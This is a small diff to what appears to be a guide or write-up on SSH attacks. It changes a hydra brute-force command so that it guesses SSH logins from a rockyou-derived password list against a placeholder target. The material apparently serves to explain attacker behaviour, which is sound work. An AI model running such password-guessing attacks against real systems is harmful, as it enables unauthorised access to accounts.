@@ -179,7 +179,7 @@ SSH Service Detected
 
 The attacker attempts to guess passwords.
 ```
-hydra -L users.txt -P passwords.txt ssh://"Target IP"
+hydra -L users.txt -P rockyou-extract.txt ssh://"Target IP"
 ```
 Workflow
 ```
